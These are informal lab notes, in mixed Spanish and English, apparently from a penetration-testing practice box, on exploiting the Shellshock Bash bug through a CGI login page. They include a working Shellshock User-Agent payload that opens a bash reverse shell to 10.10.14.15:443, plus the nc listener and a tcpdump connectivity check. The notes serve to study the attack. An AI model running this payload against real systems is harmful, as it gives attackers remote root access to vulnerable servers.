Shellshock, también conocida como Bashdoor, ​ es una familia de bugs de seguridad en la ampliamente usada Bash de Shell de Unix. El primero de estos bugs fue divulgado el 24 de septiembre de 2014. [Wikipedia](https://es.wikipedia.org/wiki/Shellshock_(error_de_software))


Shellshock how attackers :
https://blog.cloudflare.com/inside-shellshock/



The idea is execute commands remotely to gain access to the system (similar to log poisoning (???))


on the url something like  CGI its an alarm sound, it can be another ... not allways "cgi".
https://10.10.10.7:100000/session_login.cgi

You allways most google the extensions of the files, in this case it can be a file written on perl or C.

Now he is goinf to intercept it with burpsuit

And we change the user agent content by this one or the command that we want to execute
```
() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1
```

Now we can use nc to listen from our machine waiting for the reverse shell

```
nc -nlvp 443
```

and then we connect as root to that machine, with a shellshock attack


We can execute a ping from that machine to the mine and watch if we have conectivity.
```
tcpdump -i tun0 icmp
```

